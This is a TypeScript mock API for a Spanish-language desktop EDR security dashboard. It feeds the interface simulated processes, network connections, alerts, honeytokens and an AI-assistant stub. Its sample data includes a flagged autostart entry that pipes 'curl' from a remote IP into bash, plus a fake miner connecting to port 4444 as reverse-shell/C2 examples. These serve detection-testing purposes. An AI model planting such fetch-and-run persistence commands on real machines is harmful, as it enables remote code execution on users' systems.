import type {
  Alert,
  AppSettings,
  FileEvent,
  NetworkConnection,
  ProcessInfo,
  ProtectionState,
  QuarantineItem,
  SecuritySnapshot,
  Severity,
  UsbDevice,
  AiSettings,
  AiChatMessage,
  AiStreamDelta,
  AiConfirmationRequest,
  ScoreExplanation,
  HoneytokenFile,
  FileBackupEntry,
  BrowserExtensionInfo,
  PlaybookRule,
  SelfNetworkLogEntry
} from '@shared/types'
import type { AegisApi, ActionResult } from './ipcClient'

/**
 * Adaptador de demostracion: reproduce el contrato de la API real (window.aegis)
 * con datos simulados y coherentes, para poder disenar/probar la interfaz en el
 * navegador (fuera de Electron) sin depender del agente nativo.
 */

let idCounter = 1
const nextId = () => `mock-${idCounter++}`

function weightFor(sev: Severity) {
  return { critical: 28, high: 16, medium: 8, low: 3, info: 0 }[sev]
}

function computeScore(alerts: Alert[]) {
  const active = alerts.filter((a) => !a.acknowledged)
  const penalty = active.reduce((sum, a) => sum + weightFor(a.severity), 0)
  const score = Math.max(0, Math.min(100, 100 - penalty))
  let label: SecuritySnapshot['scoreLabel'] = 'Excelente'
  if (score < 40) label = 'Critico'
  else if (score < 70) label = 'En riesgo'
  else if (score < 90) label = 'Bueno'
  return { score, label }
}

function makeAlert(partial: Omit<Alert, 'id' | 'time' | 'acknowledged' | 'autoBlocked'> & { autoBlocked?: boolean }): Alert {
  return {
    id: nextId(),
    time: new Date().toISOString(),
    acknowledged: false,
    autoBlocked: partial.autoBlocked ?? false,
    ...partial
  }
}

const baseProcesses: ProcessInfo[] = [
  { pid: 1042, ppid: 1, name: 'systemd', path: '/usr/lib/systemd/systemd', user: 'root', cpu: 0.2, memMb: 12, startedAt: '08:12:01', riskScore: 0, riskReasons: [], blocked: false },
  { pid: 2210, ppid: 1042, name: 'chromium', path: '/usr/bin/chromium', user: 'kali', cpu: 14.5, memMb: 812, startedAt: '09:03:44', riskScore: 0, riskReasons: [], blocked: false },
  { pid: 2344, ppid: 1042, name: 'code', path: '/usr/share/code/code', user: 'kali', cpu: 6.1, memMb: 640, startedAt: '09:04:10', riskScore: 0, riskReasons: [], blocked: false },
  { pid: 2601, ppid: 1042, name: 'sshd', path: '/usr/sbin/sshd', user: 'root', cpu: 0.0, memMb: 8, startedAt: '08:12:20', riskScore: 0, riskReasons: [], blocked: false },
  { pid: 5521, ppid: 1, name: 'xh31mm2', path: '/tmp/.cache/xh31mm2', user: 'kali', cpu: 91.4, memMb: 210, startedAt: '11:41:02', riskScore: 88, riskReasons: ['Coincide con firma conocida de minero de criptomonedas', 'Ejecutable lanzado desde una ruta temporal o poco habitual', 'Consumo de CPU anormalmente alto (91%)'], blocked: false },
  { pid: 5602, ppid: 5521, name: 'bash', path: '/bin/bash', user: 'kali', cpu: 0.3, memMb: 4, startedAt: '11:41:05', riskScore: 12, riskReasons: ['Proceso hijo de un binario marcado como sospechoso'], blocked: false }
]

const baseConnections: NetworkConnection[] = [
  { id: 'c1', protocol: 'tcp', localAddress: '192.168.1.24', localPort: 51322, remoteAddress: '142.250.184.14', remotePort: 443, state: 'ESTABLISHED', pid: 2210, processName: 'chromium', riskScore: 0, riskReasons: [], blocked: false },
  { id: 'c2', protocol: 'tcp', localAddress: '192.168.1.24', localPort: 22, remoteAddress: '192.168.1.10', remotePort: 51900, state: 'ESTABLISHED', pid: 2601, processName: 'sshd', riskScore: 0, riskReasons: [], blocked: false },
  { id: 'c3', protocol: 'tcp', localAddress: '192.168.1.24', localPort: 44810, remoteAddress: '185.220.101.45', remotePort: 4444, state: 'ESTABLISHED', pid: 5521, processName: 'xh31mm2', riskScore: 82, riskReasons: ['Puerto remoto 4444 asociado a shells reversas / C2'], blocked: false }
]

const initialAlerts: Alert[] = [
  makeAlert({ severity: 'critical', category: 'process', title: 'Proceso sospechoso detectado: xh31mm2', message: 'Coincide con firma conocida de minero de criptomonedas. Consumo de CPU anormalmente alto (91%). PID 5521, ruta: /tmp/.cache/xh31mm2.', sourceId: '5521' }),
  makeAlert({ severity: 'critical', category: 'network', title: 'Conexion sospechosa hacia 185.220.101.45:4444', message: 'Puerto remoto 4444 asociado a shells reversas / C2. Proceso: xh31mm2 (PID 5521).', sourceId: 'c3' }),
  makeAlert({ severity: 'medium', category: 'usb', title: 'Nuevo dispositivo USB conectado: Kingston DataTraveler', message: 'Fabricante: Kingston. Verifica que reconoces este dispositivo.', sourceId: 'usb1' }),
  makeAlert({ severity: 'low', category: 'persistence', title: 'Nueva entrada de autoarranque: backup-sync.desktop', message: 'Se ha registrado un nuevo punto de persistencia (autostart-desktop).', sourceId: 'p1' }),
  makeAlert({ severity: 'info', category: 'system', title: 'Aegis EDR activo', message: 'La monitorizacion en tiempo real ha comenzado correctamente.' })
]

const usbEvents: UsbDevice[] = [
  { id: 'usb1', name: 'Kingston DataTraveler', vendor: 'Kingston', event: 'connected', time: new Date(Date.now() - 1000 * 60 * 12).toISOString() }
]

const fileEvents: FileEvent[] = [
  { id: 'f1', path: '~/Documents/informe_q3.docx', type: 'change', time: new Date(Date.now() - 1000 * 60 * 4).toISOString(), zone: 'user-data', riskScore: 0, riskReasons: [] },
  { id: 'f2', path: '~/Downloads/installer_update.AppImage', type: 'add', time: new Date(Date.now() - 1000 * 60 * 9).toISOString(), zone: 'user-data', riskScore: 0, riskReasons: [] },
  { id: 'f3', path: '/etc/hosts', type: 'change', time: new Date(Date.now() - 1000 * 60 * 30).toISOString(), zone: 'critical-system', riskScore: 30, riskReasons: ['Modificacion de un fichero critico del sistema'] }
]

const persistence: SecuritySnapshot['persistence'] = [
  { id: 'p0', source: 'systemd', name: 'nvidia-persistenced.service', command: '/usr/bin/nvidia-persistenced --user nvidia-persistenced', location: '/etc/systemd/system', riskScore: 0, riskReasons: [], discoveredAt: new Date().toISOString() },
  { id: 'p1', source: 'autostart-desktop', name: 'backup-sync.desktop', command: 'curl -s http://185.220.101.45/sync.sh | bash', location: '~/.config/autostart/backup-sync.desktop', riskScore: 55, riskReasons: ['El autoarranque descarga contenido remoto en su ejecucion'], discoveredAt: new Date().toISOString() }
]

function initialSnapshot(settings: AppSettings): SecuritySnapshot {
  const { score, label } = computeScore(initialAlerts)
  return {
    score,
    scoreLabel: label,
    vitals: {
      cpuLoad: 38,
      memUsedPct: 54,
      memTotalGb: 16,
      diskUsedPct: 62,
      platform: 'linux',
      distro: 'Kali GNU/Linux Rolling',
      hostname: 'aegis-workstation',
      uptimeSec: 51230,
      netInSpeed: 320,
      netOutSpeed: 84
    },
    processes: baseProcesses,
    connections: baseConnections,
    alerts: initialAlerts,
    persistence,
    hosts: {
      path: '/etc/hosts',
      baselineHash: 'a1b2c3',
      currentHash: 'a1b2c3',
      tampered: false,
      suspiciousEntries: [],
      lastChecked: new Date().toISOString()
    },
    fileEvents,
    usbEvents,
    protection: settings.protection,
    lastScan: new Date().toISOString(),
    incidents: []
  }
}

export const defaultSettings: AppSettings = {
  protection: {
    realtimeMonitoring: true,
    networkGuard: true,
    fileGuard: true,
    ransomwareShield: true,
    persistenceGuard: true,
    autoBlock: false
  },
  watchPaths: [],
  cpuAlertThreshold: 85,
  connectionsPerMinuteThreshold: 40,
  autoBlockSeverity: 'critical',
  updateChannel: 'stable',
  telemetryOptIn: false,
  honeytokensEnabled: true,
  backupBeforeChange: true,
  webhookUrl: null,
  webhookFormat: 'generic'
}

export function createMockApi(): AegisApi {
  let settings: AppSettings = JSON.parse(JSON.stringify(defaultSettings))
  let snapshot = initialSnapshot(settings)
  const quarantine: QuarantineItem[] = []
  const snapshotListeners = new Set<(s: SecuritySnapshot) => void>()
  const alertListeners = new Set<(a: Alert) => void>()

  function emitSnapshot() {
    const s = { ...snapshot, lastScan: new Date().toISOString() }
    snapshot = s
    snapshotListeners.forEach((cb) => cb(s))
  }

  function pushAlert(a: Alert) {
    snapshot = { ...snapshot, alerts: [a, ...snapshot.alerts].slice(0, 200) }
    const { score, label } = computeScore(snapshot.alerts)
    snapshot = { ...snapshot, score, scoreLabel: label }
    alertListeners.forEach((cb) => cb(a))
    emitSnapshot()
  }

  function tickVitals() {
    const t = Date.now() / 4000
    const cpu = Math.max(4, Math.min(97, 32 + Math.sin(t) * 18 + (Math.random() - 0.5) * 12))
    const mem = Math.max(20, Math.min(92, 54 + Math.sin(t / 2) * 8 + (Math.random() - 0.5) * 4))
    snapshot = {
      ...snapshot,
      vitals: {
        ...snapshot.vitals,
        cpuLoad: Math.round(cpu),
        memUsedPct: Math.round(mem),
        netInSpeed: Math.max(0, Math.round(280 + Math.sin(t * 1.3) * 220 + Math.random() * 80)),
        netOutSpeed: Math.max(0, Math.round(60 + Math.sin(t * 0.8) * 40 + Math.random() * 30)),
        uptimeSec: snapshot.vitals.uptimeSec + 3
      }
    }
    emitSnapshot()
  }

  const randomAlertPool: Array<() => Omit<Alert, 'id' | 'time' | 'acknowledged' | 'autoBlocked'>> = [
    () => ({ severity: 'medium', category: 'network', title: 'Escaneo de puertos entrante detectado', message: 'Multiples intentos de conexion desde 203.0.113.77 en menos de 60 segundos.' }),
    () => ({ severity: 'low', category: 'filesystem', title: 'Fichero nuevo en Descargas', message: 'installer_update.AppImage descargado y verificado sin coincidencias.' }),
    () => ({ severity: 'high', category: 'process', title: 'Uso de CPU anormal en proceso conocido', message: 'ffmpeg esta consumiendo el 96% de CPU de forma sostenida.' })
  ]

  let vitalsTimer: ReturnType<typeof setInterval> | null = null
  let alertTimer: ReturnType<typeof setInterval> | null = null

  function ensureTimers() {
    if (!vitalsTimer) vitalsTimer = setInterval(tickVitals, 2500)
    if (!alertTimer) {
      alertTimer = setInterval(() => {
        if (Math.random() < 0.35) {
          const pick = randomAlertPool[Math.floor(Math.random() * randomAlertPool.length)]()
          pushAlert(makeAlert(pick))
        }
      }, 25000)
    }
  }

  ensureTimers()

  const ok: ActionResult = { ok: true }

  // --- Estado mock para las nuevas secciones (IA, incidentes, honeytokens, backups, etc.) ---
  let aiSettings: AiSettings = { hasApiKey: false, keyStorageEncrypted: false, model: 'claude-opus-5', autonomousMode: false }
  let aiHistory: AiChatMessage[] = []
  const aiStreamListeners = new Set<(d: AiStreamDelta) => void>()
  const aiConfirmationListeners = new Set<(r: AiConfirmationRequest) => void>()

  let playbooks: PlaybookRule[] = [
    {
      id: nextId(),
      name: 'Bloquear IPs criticas automaticamente',
      enabled: true,
      condition: { category: 'network', minSeverity: 'critical' },
      action: 'block_ip',
      createdAt: new Date().toISOString(),
      timesTriggered: 3
    }
  ]

  const honeytokens: HoneytokenFile[] = [
    { path: '~/Desktop/passwords.xlsx', createdAt: new Date().toISOString(), triggered: false },
    { path: '~/Documents/aws_credentials.json', createdAt: new Date().toISOString(), triggered: false }
  ]

  const fileBackups: FileBackupEntry[] = [
    { id: nextId(), originalPath: '~/Documents/informe_q3.docx', createdAt: new Date(Date.now() - 1000 * 60 * 20).toISOString(), sizeBytes: 40960, sha256: 'a1b2c3d4e5f6'.padEnd(64, '0') }
  ]

  const browserExtensionsMock: BrowserExtensionInfo[] = [
    { browser: 'chrome', profile: 'Default', id: 'abcdefghijklmnop', name: 'Ad Blocker Pro', permissions: ['<all_urls>', 'webRequest', 'webRequestBlocking'], riskScore: 65, riskReasons: ['Solicita acceso a todas las paginas web que visitas', 'Puede interceptar o modificar trafico de red del navegador'] },
    { browser: 'chrome', profile: 'Default', id: 'qrstuvwxyzabcdef', name: 'Password Manager', permissions: ['storage'], riskScore: 5, riskReasons: [] }
  ]

  const selfNetworkLog: SelfNetworkLogEntry[] = [
    { id: nextId(), time: new Date(Date.now() - 1000 * 60 * 60).toISOString(), destination: 'github.com/D1se0/aegis-edr/releases', purpose: 'Comprobacion de actualizaciones' }
  ]

  function explainScoreMock(): ScoreExplanation {
    const active = snapshot.alerts.filter((a) => !a.acknowledged)
    const byGroup = new Map<string, { impact: number; count: number }>()
    for (const a of active) {
      const w = weightFor(a.severity)
      if (w <= 0) continue
      const key = `${a.category} · ${a.severity}`
      const entry = byGroup.get(key) || { impact: 0, count: 0 }
      entry.impact += w
      entry.count += 1
      byGroup.set(key, entry)
    }
    const factors = Array.from(byGroup.entries())
      .map(([label, v]) => ({ label, impact: v.impact, count: v.count }))
      .sort((a, b) => b.impact - a.impact)
    return { score: snapshot.score, scoreLabel: snapshot.scoreLabel, factors }
  }

  return {
    getSnapshot: async () => snapshot,
    getSettings: async () => settings,
    updateSettings: async (s) => {
      settings = s
      snapshot = { ...snapshot, protection: s.protection }
      emitSnapshot()
      return settings
    },
    runFullScan: async () => {
      pushAlert(makeAlert({ severity: 'info', category: 'system', title: 'Analisis completo finalizado', message: 'Se ha completado un analisis manual bajo demanda sin nuevas amenazas relevantes.' }))
      return snapshot
    },
    killProcess: async (pid) => {
      snapshot = { ...snapshot, processes: snapshot.processes.filter((p) => p.pid !== pid) }
      pushAlert(makeAlert({ severity: 'info', category: 'process', title: 'Proceso finalizado manualmente', message: `Se ha enviado señal de terminacion al proceso PID ${pid}.`, sourceId: String(pid), autoBlocked: true }))
      return ok
    },
    blockProcessNetwork: async (pid) => {
      snapshot = { ...snapshot, connections: snapshot.connections.map((c) => (c.pid === pid ? { ...c, blocked: true } : c)) }
      emitSnapshot()
      return ok
    },
    blockIp: async (ip, reason) => {
      snapshot = { ...snapshot, connections: snapshot.connections.map((c) => (c.remoteAddress === ip ? { ...c, blocked: true } : c)) }
      pushAlert(makeAlert({ severity: 'high', category: 'network', title: `IP bloqueada: ${ip}`, message: reason, sourceId: ip, autoBlocked: true }))
      return ok
    },
    unblockIp: async (ip) => {
      snapshot = { ...snapshot, connections: snapshot.connections.map((c) => (c.remoteAddress === ip ? { ...c, blocked: false } : c)) }
      emitSnapshot()
      return ok
    },
    quarantineFile: async (path, reason) => {
      quarantine.unshift({ id: nextId(), originalPath: path, quarantinedAt: new Date().toISOString(), reason, sha256: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', sizeBytes: 20480 })
      pushAlert(makeAlert({ severity: 'high', category: 'filesystem', title: 'Fichero puesto en cuarentena', message: `${path} ha sido aislado (${reason}).`, autoBlocked: true }))
      return ok
    },
    restoreQuarantine: async (id) => {
      const idx = quarantine.findIndex((q) => q.id === id)
      if (idx >= 0) quarantine.splice(idx, 1)
      return ok
    },
    listQuarantine: async () => quarantine,
    acknowledgeAlert: async (id) => {
      snapshot = { ...snapshot, alerts: snapshot.alerts.map((a) => (a.id === id ? { ...a, acknowledged: true } : a)) }
      const { score, label } = computeScore(snapshot.alerts)
      snapshot = { ...snapshot, score, scoreLabel: label }
      emitSnapshot()
      return true
    },
    clearAlerts: async () => {
      snapshot = { ...snapshot, alerts: snapshot.alerts.map((a) => ({ ...a, acknowledged: true })) }
      const { score, label } = computeScore(snapshot.alerts)
      snapshot = { ...snapshot, score, scoreLabel: label }
      emitSnapshot()
      return true
    },
    isolateHost: async (reason) => {
      pushAlert(makeAlert({ severity: 'critical', category: 'system', title: 'Endpoint aislado de la red (demo)', message: `Aislamiento simulado: ${reason}`, autoBlocked: true }))
      return ok
    },
    restoreNetwork: async () => {
      pushAlert(makeAlert({ severity: 'info', category: 'system', title: 'Aislamiento desactivado (demo)', message: 'La conectividad simulada ha sido restaurada.' }))
      return ok
    },
    toggleProtection: async (key, value) => {
      settings = { ...settings, protection: { ...settings.protection, [key as keyof ProtectionState]: value } }
      snapshot = { ...snapshot, protection: settings.protection }
      emitSnapshot()
      return settings
    },
    checkForUpdates: async () => {},
    windowAction: async () => {},
    openExternal: async (url) => {
      window.open(url, '_blank', 'noopener,noreferrer')
    },
    onSnapshotUpdate: (cb) => {
      snapshotListeners.add(cb)
      return () => snapshotListeners.delete(cb)
    },
    onAlert: (cb) => {
      alertListeners.add(cb)
      return () => alertListeners.delete(cb)
    },
    onUpdateStatus: () => () => {},

    // Asistente IA (mock: sin llamadas reales, sin tools, solo texto simulado)
    aiGetSettings: async () => aiSettings,
    aiSaveSettings: async (input) => {
      aiSettings = { hasApiKey: !!input.apiKey || aiSettings.hasApiKey, keyStorageEncrypted: true, model: input.model, autonomousMode: input.autonomousMode }
      return aiSettings
    },
    aiClearApiKey: async () => {
      aiSettings = { ...aiSettings, hasApiKey: false, keyStorageEncrypted: false }
      return aiSettings
    },
    aiSendMessage: async (text) => {
      if (!aiSettings.hasApiKey) return { ok: false, error: 'No hay una clave de API de Claude configurada (modo demostracion fuera de Electron).' }
      const userMsg: AiChatMessage = { id: nextId(), role: 'user', text, time: new Date().toISOString() }
      aiHistory = [...aiHistory, userMsg]
      const messageId = nextId()
      const reply = `(Demo fuera de Electron, sin llamada real a la API) He recibido tu pregunta: "${text}". En la app de escritorio esto consultaria el estado real del equipo y podria proponer acciones.`
      let sent = ''
      await new Promise<void>((resolve) => {
        let i = 0
        const timer = setInterval(() => {
          sent = reply.slice(0, i)
          aiStreamListeners.forEach((cb) => cb({ messageId, textDelta: reply.slice(Math.max(0, i - 3), i), done: false }))
          i += 3
          if (i > reply.length) {
            clearInterval(timer)
            aiStreamListeners.forEach((cb) => cb({ messageId, textDelta: '', done: true }))
            resolve()
          }
        }, 30)
      })
      aiHistory = [...aiHistory, { id: messageId, role: 'assistant', text: sent || reply, time: new Date().toISOString() }]
      return { ok: true }
    },
    aiConfirmAction: async () => {},
    aiClearConversation: async () => {
      aiHistory = []
    },
    aiGetHistory: async () => aiHistory,
    onAiStreamDelta: (cb) => {
      aiStreamListeners.add(cb)
      return () => aiStreamListeners.delete(cb)
    },
    onAiConfirmationRequest: (cb) => {
      aiConfirmationListeners.add(cb)
      return () => aiConfirmationListeners.delete(cb)
    },

    // Storyline / incidentes
    listIncidents: async () => [],

    // Score explicable
    explainScore: async () => explainScoreMock(),

    // Honeytokens
    listHoneytokens: async () => honeytokens,

    // Backups / rollback simplificado
    listFileBackups: async () => fileBackups,
    restoreFromBackup: async () => ok,

    // Auditoria de extensiones de navegador
    listBrowserExtensions: async () => browserExtensionsMock,
    scanBrowserExtensions: async () => browserExtensionsMock,

    // Modo incidente
    triggerIncidentMode: async (reason) => {
      pushAlert(makeAlert({ severity: 'critical', category: 'system', title: 'Modo Incidente activado (demo)', message: `Aislamiento y respuesta simulados: ${reason}`, autoBlocked: true }))
      return { ok: true, bundlePath: 'demo://incident-bundle.zip' }
    },

    // Playbooks
    listPlaybooks: async () => playbooks,
    savePlaybook: async (rule) => {
      if (rule.id) {
        playbooks = playbooks.map((p) => (p.id === rule.id ? { ...p, ...rule } : p))
        return playbooks.find((p) => p.id === rule.id)!
      }
      const created: PlaybookRule = { ...rule, id: nextId(), createdAt: new Date().toISOString(), timesTriggered: 0 }
      playbooks = [created, ...playbooks]
      return created
    },
    deletePlaybook: async (id) => {
      playbooks = playbooks.filter((p) => p.id !== id)
      return true
    },

    // Auto-vigilancia de red propia
    listSelfNetworkLog: async () => selfNetworkLog,

    // Config-as-code
    exportConfig: async () => ({ version: 1, exportedAt: new Date().toISOString(), settings, playbooks }),
    importConfig: async (raw) => {
      try {
        const parsed = JSON.parse(raw) as { settings?: AppSettings; playbooks?: PlaybookRule[] }
        if (parsed.settings) settings = { ...settings, ...parsed.settings }
        if (parsed.playbooks) playbooks = parsed.playbooks
        emitSnapshot()
        return ok
      } catch (err) {
        return { ok: false, error: `JSON invalido: ${String(err)}` }
      }
    },

    // Insignia de score
    getScoreBadgeSvg: async () =>
      `<svg xmlns="http://www.w3.org/2000/svg" width="250" height="20"><rect width="250" height="20" fill="#05070d"/><text x="10" y="14" fill="#fff" font-family="sans-serif" font-size="11">Protegido por Aegis EDR — ${snapshot.score}/100 · ${snapshot.scoreLabel}</text></svg>`
  }
}
